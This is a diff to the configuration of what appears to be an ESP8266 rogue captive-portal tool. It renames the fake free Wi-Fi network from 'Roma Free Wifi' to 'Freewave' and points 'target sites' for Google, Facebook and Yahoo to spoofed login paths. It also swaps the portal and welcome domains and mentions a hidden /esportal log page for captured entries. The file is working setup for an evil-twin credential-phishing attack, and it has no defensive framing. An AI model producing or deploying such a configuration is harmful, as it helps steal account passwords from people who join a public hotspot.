@@ -6,30 +6,30 @@ const char *update_username="admin";
 const char *update_password="admin";
 
 //Name of Access Point
-const char *setSSID="Roma Free Wifi";
+const char *setSSID="Freewave";
 
 //enter URLs HERE for target sites - example: String SITE1="www.exploit.agency";
 //do not use www.
 
 // google
-String GOOGLE="google.it";
+String GOOGLE="google.com";
 const char *SITE1_redirect="/login";
 
 // facebook
-String FACEBOOK="facebook.it";
+String FACEBOOK="facebook.com";
 const char *SITE2_redirect="/sign-in";
 
 // yahoo
-String YAHOO="yahoo.it";
+String YAHOO="yahoo.com";
 const char *SITE3_redirect="/authenticate";
 
 //all other requests for "anysite.com" go to www.anysite.com/user/login
 const char *SITEOTHER_redirect="/user/login";
 
 //Portal Login Redirect Success Page www.accesspoint.com/welcome
-String WELCOMEDOMAIN="provinciawifi.it";
+String WELCOMEDOMAIN="freewave.at";
 const char *PORTALLOGIN_redirect="/welcome";
-String PORTALLOGIN="bibliotu.it"; //192.168.1.1"; //IP of ESP8266 has to go here for it to work
+String PORTALLOGIN="hiddenbek.net"; //192.168.1.1"; //IP of ESP8266 has to go here for it to work
 
 //access ESPORTAL Logs at www.anysite.com/esportal
 //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
